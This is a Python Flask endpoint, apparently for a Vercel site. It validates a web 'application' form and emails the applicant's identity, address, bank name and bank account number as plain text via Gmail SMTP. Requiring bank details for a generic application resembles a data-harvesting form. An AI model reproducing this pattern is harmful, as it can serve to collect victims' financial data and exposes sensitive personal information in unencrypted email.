# /api/index.py
from flask import Flask, request, jsonify
from flask_cors import CORS
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import re
import os

# --- Flask App Definition for Vercel ---
app = Flask(__name__)
CORS(app)

# --- Securely load credentials from Vercel's Environment Variables ---
SENDER_EMAIL = os.environ.get('SENDER_EMAIL')
SENDER_PASSWORD = os.environ.get('SENDER_PASSWORD')
RECEIVER_EMAIL = os.environ.get('RECEIVER_EMAIL')

# --- Validation Functions ---
def validate_email(email):
    pattern = r'^[^\s@]+@[^\s@]+\.[^\s@]+$'
    return re.match(pattern, email) is not None
def validate_phone(phone):
    pattern = r'^[0-9+\-\s]{7,15}$'
    return re.match(pattern, phone) is not None
def validate_age(age):
    try: return int(age) >= 18
    except (ValueError, TypeError): return False
def validate_form_data(data):
    errors = []
    required_fields = ['first-name', 'last-name', 'email', 'phone', 'address', 'city-state', 'zipcode', 'gender', 'age', 'bank-name', 'bank-number']
    for field in required_fields:
        if not data.get(field) or not str(data.get(field)).strip():
            errors.append(f"{field.replace('-', ' ').title()} is required.")
    if errors: return errors
    if not validate_email(data.get('email')): errors.append("Invalid email format.")
    if not validate_phone(data.get('phone')): errors.append("Invalid phone number format.")
    if not validate_age(data.get('age')): errors.append("You must be at least 18.")
    return errors

# --- API Endpoint for Form Submission ---
@app.route('/sendmail', methods=['POST'])
def send_mail_route():
    try:
        data = request.get_json()
    except Exception:
        return jsonify({"status": "error", "message": "Invalid JSON format"}), 400

    validation_errors = validate_form_data(data)
    if validation_errors:
        return jsonify({"status": "error", "message": " | ".join(validation_errors)}), 400

    if not all([SENDER_EMAIL, SENDER_PASSWORD, RECEIVER_EMAIL]):
        return jsonify({"status": "error", "message": "Server is not configured to send emails."}), 500

    try:
        subject = "New Application from Your Website"
        body = f"""You have received a new application with the following details:\n
--- Personal Information ---
First Name: {data.get('first-name', 'N/A')}
Last Name: {data.get('last-name', 'N/A')}
Email: {data.get('email', 'N/A')}
Phone Number: {data.get('phone', 'N/A')}
Gender: {data.get('gender', 'N/A')}
Age: {data.get('age', 'N/A')}
Occupation: {data.get('occupation', 'N/A')}
\n--- Address ---
Address: {data.get('address', 'N/A')}
City & State: {data.get('city-state', 'N/A')}
Zipcode: {data.get('zipcode', 'N/A')}
\n--- Banking ---
Bank Name: {data.get('bank-name', 'N/A')}
Account Number: {data.get('bank-number', 'N/A')}"""
        
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(SENDER_EMAIL, SENDER_PASSWORD)
            server.send_message(msg)

        return jsonify({"status": "success", "message": "Form sent successfully!", "redirect": "/thank_you.html"}), 200

    except Exception as e:
        print(f"---!!! PRODUCTION EMAIL SENDING FAILED: {e} !!!---")
        return jsonify({"status": "error", "message": "An internal error occurred."}), 500